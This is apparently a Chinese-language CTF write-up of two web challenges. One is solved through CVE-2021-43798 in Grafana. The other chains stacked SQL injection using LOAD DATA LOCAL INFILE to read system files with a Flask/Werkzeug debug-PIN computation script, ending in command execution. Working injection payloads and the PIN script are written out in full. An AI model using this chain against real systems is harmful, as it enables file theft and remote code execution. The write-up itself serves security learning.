## web-oh-my-grafana

docker环境golang更新导致搭建不了，不过这题相当于**bytectf**也简单一点

就是**CVE-2021-43798**，flag文件就在根目录下

## web-oh-my-notepro

**sql注入+flask算pin**

奇怪的组合又多了

首先随便登陆，发现有个写文章，写篇文章

然后看文章，你就会发现上面的id很像sql注入，随便输个值就报错

在报错中你可以看到这行代码

```py
 result = db.session.execute(sql, params={"multi":True})
    db.session.commit()
 
    result = result.fetchone()
    data = {
        'title': result[4],
        'text': result[3],
    }
    return render_template('note.html', data=data)
 
```

**params={"multi":True}**这个表示可以多行注入，那么就给了我们读文件的机会

```mysql
';create table bbb(name varchar(1000));load data local infile "/sys/class/net/eth0/address" into table ctf.bbb;%23
'union select 1,2,3,4,(select group_concat(name) from ctf.bbb);%23
```

先创一个表，然后把文件存入表内的一列里面，然后读

依次可以读完所有文件(注意是**python3.8**)

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377957891',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '1cc402dd0e11d5ae18db04a6de87223d45fb939a61656751c3cdb6a27307b9c947937dc15ebb759ec48e43dcdc76c771'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
            continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

然后算出pin，执行根目录下的**readflag**得到flag